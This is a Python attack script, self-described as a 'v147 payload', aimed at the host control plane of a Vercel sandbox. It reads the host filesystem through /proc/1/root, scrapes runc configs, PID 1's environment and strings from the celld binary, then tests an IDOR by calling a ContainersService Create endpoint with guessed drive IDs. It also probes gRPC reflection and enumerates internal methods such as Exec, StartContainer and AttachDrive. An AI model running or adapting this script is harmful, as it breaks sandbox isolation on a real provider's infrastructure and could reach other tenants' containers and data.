# -*- coding: utf-8 -*-
"""v147 payload: drive_id 挖掘 + Create(drive_id) IDOR + gRPC 反射 + gRPC 原生枚举
输出 /vercel/sandbox/v147c.out"""
import socket, struct, time, json, os, signal, re

OUT = '/vercel/sandbox/v147c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(290)

R = '/proc/1/root'
CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def dechunk(d):
    out = b''
    off = 0
    while off < len(d):
        i = d.find(b'\r\n', off)
        if i < 0:
            break
        try:
            ln = int(d[off:i].split(b';')[0], 16)
        except Exception:
            break
        if ln == 0:
            # trailers 在 0\r\n 之后
            out += d[i + 2:]
            break
        out += d[i + 2:i + 2 + ln]
        off = i + 2 + ln + 2
    return out


def raw_req(sockpath, path, body, t=2.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def grpc_req(path, proto_body, t=3):
    """原生 gRPC: 5 字节帧 + application/grpc, 返回 (status, grpc_status, grpc_message, payload)"""
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(CELL)
        body = b'\x00' + struct.pack('>I', len(proto_body)) + proto_body
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        hdrs = d[:hdr_end].decode(errors='replace') if hdr_end > 0 else ''
        b2 = d[hdr_end + 4:] if hdr_end > 0 else b''
        gs = gm = ''
        for hln in hdrs.split('\r\n'):
            l = hln.lower()
            if l.startswith('grpc-status'):
                gs = hln.split(':', 1)[1].strip()
            if l.startswith('grpc-message'):
                gm = hln.split(':', 1)[1].strip()
        if b2[:1:].isdigit() and b'\r\n' in b2[:10]:
            raw = dechunk(b2)
            # trailer 里可能有 grpc-status
            for tln in raw.split(b'\r\n'):
                if tln.lower().startswith(b'grpc-status:'):
                    gs = tln.split(b':', 1)[1].strip().decode(errors='replace')
                if tln.lower().startswith(b'grpc-message:'):
                    gm = tln.split(b':', 1)[1].strip().decode(errors='replace')
        else:
            raw = b2
        payload = b''
        if len(raw) >= 5:
            ln = struct.unpack('>I', raw[1:5])[0]
            payload = raw[5:5 + ln]
        else:
            payload = raw
        return st, gs, gm, payload
    except Exception as e:
        return 'EXC %s' % type(e).__name__, '', '', b''


def parse_refl(payload):
    """解析 ServerReflectionResponse, 提取 list_services 名字"""
    names = []
    off = 0
    try:
        while off < len(payload):
            tag = payload[off]; off += 1
            fn = tag >> 3; wt = tag & 7
            if wt != 2:
                off += 1
                continue
            ln = 0; sh = 0
            while True:
                b = payload[off]; off += 1
                ln |= (b & 127) << sh; sh += 7
                if not (b & 128):
                    break
            v = payload[off:off + ln]; off += ln
            if fn == 6:
                o2 = 0
                while o2 < len(v):
                    t2 = v[o2]; o2 += 1
                    if t2 & 7 != 2:
                        o2 += 1
                        continue
                    l2 = 0; sh2 = 0
                    while True:
                        b = v[o2]; o2 += 1
                        l2 |= (b & 127) << sh2; sh2 += 7
                        if not (b & 128):
                            break
                    v2 = v[o2:o2 + l2]; o2 += l2
                    if t2 >> 3 == 1:
                        o3 = 0
                        while o3 < len(v2):
                            t3 = v2[o3]; o3 += 1
                            if t3 == 0x0a:  # field 1 LEN (name)
                                l3 = 0; sh3 = 0
                                while True:
                                    b = v2[o3]; o3 += 1
                                    l3 |= (b & 127) << sh3; sh3 += 7
                                    if not (b & 128):
                                        break
                                names.append(v2[o3:o3 + l3].decode(errors='replace'))
                                o3 += l3
                            else:
                                o3 += 1
            elif fn == 7:
                names.append('ERROR_RESP:%r' % v[:200])
    except Exception as e:
        names.append('PARSE_EXC %s' % e)
    return names


# ============ 1: host drive 侦察 ============
log('=== 1 host drive recon ===')
try:
    for name in sorted(os.listdir(R + '/run/cell')):
        p = R + '/run/cell/' + name
        try:
            st = os.stat(p)
            if st.st_mode & 0o170000 == 0o040000:
                log('cell/%s/ = %s' % (name, sorted(os.listdir(p))[:40]))
            elif st.st_mode & 0o170000 != 0o140000:
                data = open(p, 'rb').read(3000)
                log('cell/%s (%d): %r' % (name, st.st_size, data[:1000]))
        except Exception as e:
            log('cell/%s EXC %s' % (name, e))
except Exception as e:
    log('ls /run/cell EXC %s' % e)

runc_cands = []
for base in ['/run/cell/runc', R + '/run/cell/runc']:
    try:
        for d in sorted(os.listdir(base)):
            p = base + '/' + d
            log('runc/%s: %s' % (d, sorted(os.listdir(p))[:25]))
            runc_cands.append(d)
            for fn in ['config.json', 'state.json']:
                fp = p + '/' + fn
                try:
                    data = open(fp, 'rb').read(4000)
                    log('  %s: %r' % (fn, data[:2000]))
                except Exception:
                    pass
    except Exception as e:
        log('runc %s EXC %s' % (base, e))

# celld 二进制 drive/hvc 字符串
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    log('celld size=%d' % len(data))
    pats = set()
    for m in re.finditer(rb'[A-Za-z0-9_.-]{4,}(?:drive|Drive|DRIVE)[A-Za-z0-9_.-]{4,}', data):
        pats.add(m.group().decode(errors='replace'))
    for s in sorted(pats)[:60]:
        log('DRV %s' % s)
    hvc = set()
    for m in re.finditer(rb'hvc_[A-Za-z0-9_]{10,80}', data):
        hvc.add(m.group().decode(errors='replace'))
    for s in sorted(hvc)[:30]:
        log('HVC %s' % s)
except Exception as e:
    log('celld scan EXC %s' % e)

# pid1 env 全文 (找 drive/cell 相关)
try:
    for e in open('/proc/1/environ', 'rb').read().split(b'\x00'):
        if e and (b'drive' in e.lower() or b'cell' in e.lower() or b'vdb' in e.lower() or b'workload' in e.lower()):
            log('pid1 env: %r' % e[:300])
except Exception as e:
    log('pid1 env EXC %s' % e)

# 我们的 rootfs vdb 上是否有 drive 标识
try:
    for ln in open('/proc/self/mountinfo', errors='replace'):
        if 'vdb' in ln or '/mnt/g' in ln:
            log('mountinfo: %s' % ln.strip()[:250])
except Exception:
    pass

# ============ 2: Create drive_id 测试 ============
log('=== 2 Create drive_id ===')
cands = list(dict.fromkeys(runc_cands))
cands += ['hvc_iad1_%s' % u if not u.startswith('hvc') else u for u in runc_cands]
# 从 config.json 提取的潜在 drive 标识 (如果上面打印里有)
extra = []
try:
    for base in [R + '/run/cell/runc']:
        for d in sorted(os.listdir(base)):
            try:
                cfg = open(base + '/' + d + '/config.json', 'rb').read(4000)
                for m in re.finditer(rb'[A-Za-z0-9_./-]{8,60}', cfg):
                    s = m.group().decode(errors='replace')
                    if ('vdb' in s or 'drive' in s.lower() or s.startswith('/dev')):
                        extra.append(s)
            except Exception:
                pass
except Exception:
    pass
cands += extra
for did in cands:
    if not did or len(did) > 80:
        continue
    st, pay = raw_req(CELL, '%s/Create' % CTRS, json.dumps({'drive_id': did}).encode(), t=3)
    log('Create drive_id=%r -> %s %r' % (did, st, pay[:300]))
    if '200' in st:
        log('!!! SUCCESS drive_id=%r resp=%r' % (did, pay[:600]))

# ============ 3: gRPC 反射 ============
log('=== 3 grpc reflection ===')
for refl_path in ['/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo',
                  '/grpc.reflection.v1.ServerReflection/ServerReflectionInfo']:
    st, gs, gm, pay = grpc_req(refl_path, b'\x3a\x00', t=4)  # list_services field 7
    log('REFL %s -> %s gs=%s gm=%r pay=%r' % (refl_path, st, gs, gm, pay[:400]))
    if '200' in st and pay:
        names = parse_refl(pay)
        for n in names[:80]:
            log('  SVCLIST %s' % n)

# ============ 4: gRPC 原生枚举 (JSON 404 的服务) ============
log('=== 4 grpc native enum ===')
SERVICES = {
    'CELLS': ('vercel.hive.api.cells.v1.CellsService',
              ['StartCell', 'StopCell', 'RunCell', 'PoolCell', 'GetCellAddress', 'IsCellAlive',
               'ExtendPorts', 'EnableSnapshotOnShutdown', 'List', 'Get']),
    'CELD': ('vercel.hive.celld.api.v1.CelldService',
             ['Configure', 'SetWorkload', 'Heartbeat', 'Shutdown', 'StartContainer', 'StopContainer',
              'WaitContainer', 'GetDriveStorageUsage']),
    'HOST': ('vercel.hive.host.api.v1.HostService',
             ['CreateSnapshot', 'GetResourceUsage', 'GetProxyCertificates', 'GetOCIImageConfig',
              'SetOCIImageConfig', 'WaitForDrive']),
    'POOL': ('vercel.hive.api.pools.v1.PoolsService',
             ['PutPool', 'GetPool', 'DeletePool']),
    'DRV': ('vercel.hive.cell.api.drives.v1.DrivesService',
            ['CreateSnapshot', 'SetOCIImageConfig', 'GetOCIImageConfig', 'AttachDrive', 'DetachDrive',
             'GetDriveUsage', 'Mount', 'Unmount', 'Create', 'Delete', 'List']),
    'CTRS': ('vercel.hive.cell.api.containers.v1.ContainersService',
             ['Create', 'Start', 'Exec', 'Kill', 'Wait', 'Mount', 'Stdin', 'StreamOutput', 'List', 'Get', 'Stop']),
    'PROC': ('vercel.hive.cell.api.processes.v1.ProcessService',
             ['Start', 'Exec', 'Kill', 'Wait', 'StreamOutput', 'List', 'Get']),
    'USAGE': ('vercel.hive.cell.api.usage.v1.UsageService',
              ['GetResourceUsage', 'List', 'Get']),
}
for tag, (svc, methods) in SERVICES.items():
    for m in methods:
        st, gs, gm, pay = grpc_req('%s/%s' % (svc, m), b'', t=2)
        if '404' in st:
            continue
        log('GRPC %s/%s -> %s gs=%s gm=%r pay=%r' % (tag, m, st, gs, gm[:150], pay[:150]))

log('V147_DONE')
f.close()
